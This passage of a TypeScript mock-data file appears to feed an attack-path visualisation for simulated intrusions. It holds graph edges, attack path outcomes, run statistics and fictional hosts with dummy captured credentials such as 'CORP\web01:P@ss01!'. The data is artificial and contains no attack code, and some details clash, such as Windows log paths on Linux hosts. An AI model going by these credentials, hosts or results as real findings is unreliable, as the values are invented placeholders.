    { edge_id:'s6_90EP-e-al-33', edge_type:'asset_link', edge_source:'s6_90EP-act33', edge_target:'s6_90EP-ep62' },
    { edge_id:'s6_90EP-e-al-34', edge_type:'asset_link', edge_source:'s6_90EP-act34', edge_target:'s6_90EP-ep63' },
    { edge_id:'s6_90EP-e-al-35', edge_type:'asset_link', edge_source:'s6_90EP-act35', edge_target:'s6_90EP-ep64' },
    { edge_id:'s6_90EP-e-al-36', edge_type:'asset_link', edge_source:'s6_90EP-act36', edge_target:'s6_90EP-ep65' },
    { edge_id:'s6_90EP-e-al-37', edge_type:'asset_link', edge_source:'s6_90EP-act37', edge_target:'s6_90EP-ep66' },
    { edge_id:'s6_90EP-e-al-38', edge_type:'asset_link', edge_source:'s6_90EP-act38', edge_target:'s6_90EP-ep73' },
    { edge_id:'s6_90EP-e-al-39', edge_type:'asset_link', edge_source:'s6_90EP-act39', edge_target:'s6_90EP-ep74' },
    { edge_id:'s6_90EP-e-al-40', edge_type:'asset_link', edge_source:'s6_90EP-act40', edge_target:'s6_90EP-ep75' },
    { edge_id:'s6_90EP-e-al-41', edge_type:'asset_link', edge_source:'s6_90EP-act41', edge_target:'s6_90EP-ep76' },
    { edge_id:'s6_90EP-e-al-42', edge_type:'asset_link', edge_source:'s6_90EP-act42', edge_target:'s6_90EP-ep77' },
    { edge_id:'s6_90EP-e-al-43', edge_type:'asset_link', edge_source:'s6_90EP-act43', edge_target:'s6_90EP-ep78' },
    { edge_id:'s6_90EP-e-al-44', edge_type:'asset_link', edge_source:'s6_90EP-act44', edge_target:'s6_90EP-ep79' },
    { edge_id:'s6_90EP-e-al-45', edge_type:'asset_link', edge_source:'s6_90EP-act45', edge_target:'s6_90EP-ep80' },
    { edge_id:'s6_90EP-e-al-46', edge_type:'asset_link', edge_source:'s6_90EP-act46', edge_target:'s6_90EP-ep81' },
    { edge_id:'s6_90EP-e-al-47', edge_type:'asset_link', edge_source:'s6_90EP-act47', edge_target:'s6_90EP-ep82' },
    { edge_id:'s6_90EP-e-cf-1', edge_type:'chain_flow', edge_source:'s6_90EP-act01', edge_target:'s6_90EP-act02' },
    { edge_id:'s6_90EP-e-cf-2', edge_type:'chain_flow', edge_source:'s6_90EP-act02', edge_target:'s6_90EP-act03' },
    { edge_id:'s6_90EP-e-cf-3', edge_type:'chain_flow', edge_source:'s6_90EP-act03', edge_target:'s6_90EP-act04' },
    { edge_id:'s6_90EP-e-cf-4', edge_type:'chain_flow', edge_source:'s6_90EP-act04', edge_target:'s6_90EP-act05' },
    { edge_id:'s6_90EP-e-cf-5', edge_type:'chain_flow', edge_source:'s6_90EP-act05', edge_target:'s6_90EP-act06' },
    { edge_id:'s6_90EP-e-cf-6', edge_type:'chain_flow', edge_source:'s6_90EP-act06', edge_target:'s6_90EP-act07' },
    { edge_id:'s6_90EP-e-cf-7', edge_type:'chain_flow', edge_source:'s6_90EP-act07', edge_target:'s6_90EP-act08' },
    { edge_id:'s6_90EP-e-cf-8', edge_type:'chain_flow', edge_source:'s6_90EP-act08', edge_target:'s6_90EP-act09' },
    { edge_id:'s6_90EP-e-cf-9', edge_type:'chain_flow', edge_source:'s6_90EP-act09', edge_target:'s6_90EP-act10' },
    { edge_id:'s6_90EP-e-cf-10', edge_type:'chain_flow', edge_source:'s6_90EP-act10', edge_target:'s6_90EP-act11' },
    { edge_id:'s6_90EP-e-cf-11', edge_type:'chain_flow', edge_source:'s6_90EP-act11', edge_target:'s6_90EP-act12' },
    { edge_id:'s6_90EP-e-cf-12', edge_type:'chain_flow', edge_source:'s6_90EP-act12', edge_target:'s6_90EP-act13' },
    { edge_id:'s6_90EP-e-cf-13', edge_type:'chain_flow', edge_source:'s6_90EP-act13', edge_target:'s6_90EP-act14' },
    { edge_id:'s6_90EP-e-cf-14', edge_type:'chain_flow', edge_source:'s6_90EP-act14', edge_target:'s6_90EP-act15' },
    { edge_id:'s6_90EP-e-cf-15', edge_type:'chain_flow', edge_source:'s6_90EP-act15', edge_target:'s6_90EP-act16' },
    { edge_id:'s6_90EP-e-cf-16', edge_type:'chain_flow', edge_source:'s6_90EP-act16', edge_target:'s6_90EP-act17' },
    { edge_id:'s6_90EP-e-cf-17', edge_type:'chain_flow', edge_source:'s6_90EP-act17', edge_target:'s6_90EP-act18' },
    { edge_id:'s6_90EP-e-cf-18', edge_type:'chain_flow', edge_source:'s6_90EP-act18', edge_target:'s6_90EP-act19' },
    { edge_id:'s6_90EP-e-cf-19', edge_type:'chain_flow', edge_source:'s6_90EP-act19', edge_target:'s6_90EP-act20' },
    { edge_id:'s6_90EP-e-cf-20', edge_type:'chain_flow', edge_source:'s6_90EP-act20', edge_target:'s6_90EP-act21' },
    { edge_id:'s6_90EP-e-cf-21', edge_type:'chain_flow', edge_source:'s6_90EP-act21', edge_target:'s6_90EP-act22' },
    { edge_id:'s6_90EP-e-cf-22', edge_type:'chain_flow', edge_source:'s6_90EP-act22', edge_target:'s6_90EP-act23' },
    { edge_id:'s6_90EP-e-cf-23', edge_type:'chain_flow', edge_source:'s6_90EP-act23', edge_target:'s6_90EP-act24' },
    { edge_id:'s6_90EP-e-cf-24', edge_type:'chain_flow', edge_source:'s6_90EP-act24', edge_target:'s6_90EP-act25' },
    { edge_id:'s6_90EP-e-cf-25', edge_type:'chain_flow', edge_source:'s6_90EP-act25', edge_target:'s6_90EP-act26' },
    { edge_id:'s6_90EP-e-cf-26', edge_type:'chain_flow', edge_source:'s6_90EP-act26', edge_target:'s6_90EP-act27' },
    { edge_id:'s6_90EP-e-cf-27', edge_type:'chain_flow', edge_source:'s6_90EP-act27', edge_target:'s6_90EP-act28' },
    { edge_id:'s6_90EP-e-cf-28', edge_type:'chain_flow', edge_source:'s6_90EP-act28', edge_target:'s6_90EP-act29' },
    { edge_id:'s6_90EP-e-cf-29', edge_type:'chain_flow', edge_source:'s6_90EP-act29', edge_target:'s6_90EP-act30' },
    { edge_id:'s6_90EP-e-cf-30', edge_type:'chain_flow', edge_source:'s6_90EP-act30', edge_target:'s6_90EP-act31' },
    { edge_id:'s6_90EP-e-cf-31', edge_type:'chain_flow', edge_source:'s6_90EP-act31', edge_target:'s6_90EP-act32' },
    { edge_id:'s6_90EP-e-cf-32', edge_type:'chain_flow', edge_source:'s6_90EP-act32', edge_target:'s6_90EP-act33' },
    { edge_id:'s6_90EP-e-cf-33', edge_type:'chain_flow', edge_source:'s6_90EP-act33', edge_target:'s6_90EP-act34' },
    { edge_id:'s6_90EP-e-cf-34', edge_type:'chain_flow', edge_source:'s6_90EP-act34', edge_target:'s6_90EP-act35' },
    { edge_id:'s6_90EP-e-cf-35', edge_type:'chain_flow', edge_source:'s6_90EP-act35', edge_target:'s6_90EP-act36' },
    { edge_id:'s6_90EP-e-cf-36', edge_type:'chain_flow', edge_source:'s6_90EP-act36', edge_target:'s6_90EP-act37' },
    { edge_id:'s6_90EP-e-cf-37', edge_type:'chain_flow', edge_source:'s6_90EP-act37', edge_target:'s6_90EP-act38' },
    { edge_id:'s6_90EP-e-cf-38', edge_type:'chain_flow', edge_source:'s6_90EP-act38', edge_target:'s6_90EP-act39' },
    { edge_id:'s6_90EP-e-cf-39', edge_type:'chain_flow', edge_source:'s6_90EP-act39', edge_target:'s6_90EP-act40' },
    { edge_id:'s6_90EP-e-cf-40', edge_type:'chain_flow', edge_source:'s6_90EP-act40', edge_target:'s6_90EP-act41' },
    { edge_id:'s6_90EP-e-cf-41', edge_type:'chain_flow', edge_source:'s6_90EP-act41', edge_target:'s6_90EP-act42' },
    { edge_id:'s6_90EP-e-cf-42', edge_type:'chain_flow', edge_source:'s6_90EP-act42', edge_target:'s6_90EP-act43' },
    { edge_id:'s6_90EP-e-cf-43', edge_type:'chain_flow', edge_source:'s6_90EP-act43', edge_target:'s6_90EP-act44' },
    { edge_id:'s6_90EP-e-cf-44', edge_type:'chain_flow', edge_source:'s6_90EP-act44', edge_target:'s6_90EP-act45' },
    { edge_id:'s6_90EP-e-cf-45', edge_type:'chain_flow', edge_source:'s6_90EP-act45', edge_target:'s6_90EP-act46' },
    { edge_id:'s6_90EP-e-cf-46', edge_type:'chain_flow', edge_source:'s6_90EP-act46', edge_target:'s6_90EP-act47' },
    { edge_id:'s6_90EP-nmap-ep01', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep01' },
    { edge_id:'s6_90EP-nmap-ep02', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep02' },
    { edge_id:'s6_90EP-nmap-ep03', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep03' },
    { edge_id:'s6_90EP-nmap-ep04', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep04' },
    { edge_id:'s6_90EP-nmap-ep05', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep05' },
    { edge_id:'s6_90EP-nmap-ep06', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep06' },
    { edge_id:'s6_90EP-nmap-ep07', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep07' },
    { edge_id:'s6_90EP-nmap-ep08', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep08' },
    { edge_id:'s6_90EP-nmap-ep09', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep09' },
    { edge_id:'s6_90EP-nmap-ep10', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep10' },
    { edge_id:'s6_90EP-nmap-ep11', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep11' },
    { edge_id:'s6_90EP-nmap-ep12', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep12' },
    { edge_id:'s6_90EP-nmap-ep13', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep13' },
    { edge_id:'s6_90EP-nmap-ep14', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep14' },
    { edge_id:'s6_90EP-nmap-ep15', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep15' },
    { edge_id:'s6_90EP-nmap-ep16', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep16' },
    { edge_id:'s6_90EP-nmap-ep17', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep17' },
    { edge_id:'s6_90EP-nmap-ep18', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep18' },
    { edge_id:'s6_90EP-nmap-ep19', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep19' },
    { edge_id:'s6_90EP-nmap-ep20', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep20' },
    { edge_id:'s6_90EP-nmap-ep21', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep21' },
    { edge_id:'s6_90EP-nmap-ep22', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep22' },
    { edge_id:'s6_90EP-nmap-ep23', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep23' },
    { edge_id:'s6_90EP-nmap-ep24', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep24' },
    { edge_id:'s6_90EP-nmap-ep25', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep25' },
    { edge_id:'s6_90EP-nmap-ep26', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep26' },
    { edge_id:'s6_90EP-nmap-ep27', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep27' },
    { edge_id:'s6_90EP-nmap-ep28', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep28' },
    { edge_id:'s6_90EP-nmap-ep29', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep29' },
    { edge_id:'s6_90EP-nmap-ep30', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep30' },
    { edge_id:'s6_90EP-nmap-ep31', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep31' },
    { edge_id:'s6_90EP-nmap-ep32', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep32' },
    { edge_id:'s6_90EP-nmap-ep33', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep33' },
    { edge_id:'s6_90EP-nmap-ep34', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep34' },
    { edge_id:'s6_90EP-nmap-ep35', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep35' },
    { edge_id:'s6_90EP-nmap-ep36', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep36' },
    { edge_id:'s6_90EP-nmap-ep37', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep37' },
    { edge_id:'s6_90EP-nmap-ep38', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep38' },
    { edge_id:'s6_90EP-nmap-ep39', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep39' },
    { edge_id:'s6_90EP-nmap-ep40', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep40' },
    { edge_id:'s6_90EP-nmap-ep41', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep41' },
    { edge_id:'s6_90EP-nmap-ep42', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep42' },
    { edge_id:'s6_90EP-nmap-ep43', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep43' },
    { edge_id:'s6_90EP-nmap-ep44', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep44' },
    { edge_id:'s6_90EP-nmap-ep45', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep45' },
    { edge_id:'s6_90EP-nmap-ep46', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep46' },
    { edge_id:'s6_90EP-nmap-ep47', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep47' },
    { edge_id:'s6_90EP-nmap-ep48', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep48' },
    { edge_id:'s6_90EP-nmap-ep49', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep49' },
    { edge_id:'s6_90EP-nmap-ep50', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep50' },
    { edge_id:'s6_90EP-nmap-ep51', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep51' },
    { edge_id:'s6_90EP-nmap-ep52', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep52' },
    { edge_id:'s6_90EP-nmap-ep53', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep53' },
    { edge_id:'s6_90EP-nmap-ep54', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep54' },
    { edge_id:'s6_90EP-nmap-ep55', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep55' },
    { edge_id:'s6_90EP-nmap-ep56', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep56' },
    { edge_id:'s6_90EP-nmap-ep57', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep57' },
    { edge_id:'s6_90EP-nmap-ep58', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep58' },
    { edge_id:'s6_90EP-nmap-ep59', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep59' },
    { edge_id:'s6_90EP-nmap-ep60', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep60' },
    { edge_id:'s6_90EP-nmap-ep61', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep61' },
    { edge_id:'s6_90EP-nmap-ep62', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep62' },
    { edge_id:'s6_90EP-nmap-ep63', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep63' },
    { edge_id:'s6_90EP-nmap-ep64', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep64' },
    { edge_id:'s6_90EP-nmap-ep65', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep65' },
    { edge_id:'s6_90EP-nmap-ep66', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep66' },
    { edge_id:'s6_90EP-nmap-ep67', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep67' },
    { edge_id:'s6_90EP-nmap-ep68', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep68' },
    { edge_id:'s6_90EP-nmap-ep69', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep69' },
    { edge_id:'s6_90EP-nmap-ep70', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep70' },
    { edge_id:'s6_90EP-nmap-ep71', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep71' },
    { edge_id:'s6_90EP-nmap-ep72', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep72' },
    { edge_id:'s6_90EP-nmap-ep73', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep73' },
    { edge_id:'s6_90EP-nmap-ep74', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep74' },
    { edge_id:'s6_90EP-nmap-ep75', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep75' },
    { edge_id:'s6_90EP-nmap-ep76', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep76' },
    { edge_id:'s6_90EP-nmap-ep77', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep77' },
    { edge_id:'s6_90EP-nmap-ep78', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep78' },
    { edge_id:'s6_90EP-nmap-ep79', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep79' },
    { edge_id:'s6_90EP-nmap-ep80', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep80' },
    { edge_id:'s6_90EP-nmap-ep81', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep81' },
    { edge_id:'s6_90EP-nmap-ep82', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep82' },
    { edge_id:'s6_90EP-nmap-ep83', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep83' },
    { edge_id:'s6_90EP-nmap-ep84', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep84' },
    { edge_id:'s6_90EP-nmap-ep85', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep85' },
    { edge_id:'s6_90EP-nmap-ep86', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep86' },
    { edge_id:'s6_90EP-nmap-ep87', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep87' },
    { edge_id:'s6_90EP-nmap-ep88', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep88' },
    { edge_id:'s6_90EP-nmap-ep89', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep89' },
    { edge_id:'s6_90EP-nmap-ep90', edge_type:'asset_link', edge_source:'s6_90EP-a-nmap-bulk', edge_target:'s6_90EP-ep90' },

  ],
  attack_path_definitions: [
    {
      path_id: 's6_90EP-path1',
      path_name: 'Domain Takeover (Main Route)',
      path_color: '#42a5f5',
      path_outcome: 'success',
      node_ids: ['s6_90EP-ep01', 's6_90EP-ep02', 's6_90EP-ep03', 's6_90EP-ep04', 's6_90EP-ep19', 's6_90EP-ep20', 's6_90EP-ep21', 's6_90EP-ep37', 's6_90EP-ep38', 's6_90EP-ep39', 's6_90EP-ep40', 's6_90EP-ep73', 's6_90EP-ep74', 's6_90EP-ep75'],
    },
    {
      path_id: 's6_90EP-path2',
      path_name: 'Secure Segment Probe (Blocked)',
      path_color: '#ef5350',
      path_outcome: 'partial',
      failed_from_node_id: 's6_90EP-ep55',
      path_fail_reason: 'EDR blocked at Secure Segment',
      node_ids: ['s6_90EP-ep01', 's6_90EP-ep05', 's6_90EP-ep23', 's6_90EP-ep24', 's6_90EP-ep25', 's6_90EP-ep55', 's6_90EP-ep56', 's6_90EP-ep57', 's6_90EP-ep58'],
    },
    {
      path_id: 's6_90EP-path3',
      path_name: 'Alternate Domain Route',
      path_color: '#66bb6a',
      path_outcome: 'success',
      node_ids: ['s6_90EP-ep01', 's6_90EP-ep02', 's6_90EP-ep26', 's6_90EP-ep27', 's6_90EP-ep41', 's6_90EP-ep42', 's6_90EP-ep43', 's6_90EP-ep44', 's6_90EP-ep59', 's6_90EP-ep60', 's6_90EP-ep61', 's6_90EP-ep73', 's6_90EP-ep76', 's6_90EP-ep77'],
    },
    {
      path_id: 's6_90EP-path4',
      path_name: 'Jump Box Lateral (Detected)',
      path_color: '#ffa726',
      path_outcome: 'failed',
      failed_from_node_id: 's6_90EP-ep62',
      path_fail_reason: 'Detected and quarantined at Internal LAN',
      node_ids: ['s6_90EP-ep01', 's6_90EP-ep04', 's6_90EP-ep22', 's6_90EP-ep45', 's6_90EP-ep46', 's6_90EP-ep47', 's6_90EP-ep62', 's6_90EP-ep63', 's6_90EP-ep64', 's6_90EP-ep65', 's6_90EP-ep66', 's6_90EP-ep78', 's6_90EP-ep79', 's6_90EP-ep80', 's6_90EP-ep81'],
    },
  ],
  attack_path_stats: {
    stats_prevented: 9,
    stats_detected: 9,
    stats_undetected: 29,
    stats_pending: 0,
    stats_total_actions: 48,
    stats_executed_actions: 48,
    stats_captured_endpoints: 46,
    stats_captured_files: 48,
    stats_captured_credentials: 47,
    stats_captured_users: 33,
    stats_captured_cves: 21,
  },
};


export const MOCK_SCENARIO_APT_100EP: AttackPathData = {
  attack_path_nodes: [
    { node_id:'s5100EP-ep01', node_type:'ASSET', node_label:'WEB-01', node_hostname:'WEB-01',
      node_ip:'172.16.0.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_entry_point:true,
      node_accessed_files:['C:\\Logs\\WEB-01-audit.log'],
      node_credentials_found:['CORP\\web01:P@ss01!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep02', node_type:'ASSET', node_label:'APP-02', node_hostname:'APP-02',
      node_ip:'172.16.0.11', node_platform:'Windows Server 2019', node_status:'prevented',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep03', node_type:'ASSET', node_label:'DB-03', node_hostname:'DB-03',
      node_ip:'172.16.0.12', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\DB-03-audit.log'],
      node_credentials_found:['CORP\\db03:P@ss03!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep04', node_type:'ASSET', node_label:'FILE-04', node_hostname:'FILE-04',
      node_ip:'172.16.0.13', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep05', node_type:'ASSET', node_label:'MAIL-05', node_hostname:'MAIL-05',
      node_ip:'172.16.0.14', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\MAIL-05-audit.log'],
      node_credentials_found:['CORP\\mail05:P@ss05!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep06', node_type:'ASSET', node_label:'JUMP-06', node_hostname:'JUMP-06',
      node_ip:'172.16.0.15', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-06-audit.log'],
      node_credentials_found:['CORP\\jump06:P@ss06!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep07', node_type:'ASSET', node_label:'PRINT-07', node_hostname:'PRINT-07',
      node_ip:'172.16.0.16', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\PRINT-07-audit.log'],
      node_credentials_found:['CORP\\print07:P@ss07!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep08', node_type:'ASSET', node_label:'DNS-08', node_hostname:'DNS-08',
      node_ip:'172.16.0.17', node_platform:'Ubuntu 22.04 LTS', node_status:'detected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\DNS-08-audit.log'],
      node_credentials_found:['CORP\\dns08:P@ss08!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep09', node_type:'ASSET', node_label:'DC-09', node_hostname:'DC-09',
      node_ip:'172.16.0.18', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\DC-09-audit.log'],
      node_credentials_found:['CORP\\dc09:P@ss09!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep10', node_type:'ASSET', node_label:'WS-10', node_hostname:'WS-10',
      node_ip:'172.16.0.19', node_platform:'Windows 10', node_status:'detected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep11', node_type:'ASSET', node_label:'API-11', node_hostname:'API-11',
      node_ip:'172.16.0.20', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\API-11-audit.log'],
      node_credentials_found:['CORP\\api11:P@ss11!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep12', node_type:'ASSET', node_label:'BACKUP-12', node_hostname:'BACKUP-12',
      node_ip:'172.16.0.21', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep13', node_type:'ASSET', node_label:'MONITOR-13', node_hostname:'MONITOR-13',
      node_ip:'172.16.0.22', node_platform:'Ubuntu 22.04 LTS', node_status:'detected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_pivot:true,
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep14', node_type:'ASSET', node_label:'VPN-14', node_hostname:'VPN-14',
      node_ip:'172.16.0.23', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\VPN-14-audit.log'],
      node_credentials_found:['CORP\\vpn14:P@ss14!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s5100EP-ep15', node_type:'ASSET', node_label:'SIEM-15', node_hostname:'SIEM-15',
      node_ip:'172.16.0.24', node_platform:'Red Hat 8', node_status:'prevented',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
